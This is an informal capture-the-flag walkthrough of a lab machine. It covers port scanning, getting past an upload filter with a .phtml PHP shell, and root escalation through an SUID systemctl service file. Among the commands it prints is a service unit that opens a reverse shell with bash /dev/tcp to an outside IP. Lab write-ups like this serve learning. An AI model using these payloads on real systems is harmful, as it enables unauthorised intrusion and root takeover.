<p>started with rustscan instead of nmap if you are beginner you can just read through the manual

PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack
22/tcp   open  ssh          syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
3128/tcp open  squid-http   syn-ack
3333/tcp open  dec-notes    syn-ack



rustscan -a 10.10.13.124

nmap scan on port 3128

PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved




as following the walkthough i started the go buster scan on port 3333 and got a directory nnamed internal on the webser whic was having a upload form

as followinf walkthrough i read about burp suite and  did the intruder  attack with sniper and the list was html,php,php5,php3,phtml

i found thaat phtml was not being filtered



after that i upload the php shell with phtml extention ans opened it using the iploads doir i found in dir scan inside /internal directory /internal/uploads


started a rev shell listener in my terminal got the shell upgraded it using commands 

searched for suid binaries 

saw /bin/systemctl was having suid bit set searched in gtfo bin for that

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF


did this and in this

ExecStart=/bin/sh -c "id > /tmp/output" 

i used this

ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"

got the root flag we can also get a rev shell from root using using suid systemctl by doing this

--> 

just create a file named root.service or anything else

[Unit]
Description=roooooooooooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.17.12.104/9999 0>&1'

[Install]
WantedBy=multi-user.target


enter this corectly in thaat file

and wget this file in the victim machine after that you have to start this file by 

Before we can execute our root.service file, we need to place it onto the target file system if itâ€™s not there already. Once that is done, we just need to use systemctl to start our custom service. To do this, we first need to set up our listener. Once we do that, we need to make sure we specify our root.service file location in our systemctl command arguments.

/bin/systemctl enable /tmp/root.service

/bin/systemctl start root

you will get the rev shell connection on the shell

cheers now you are the root user
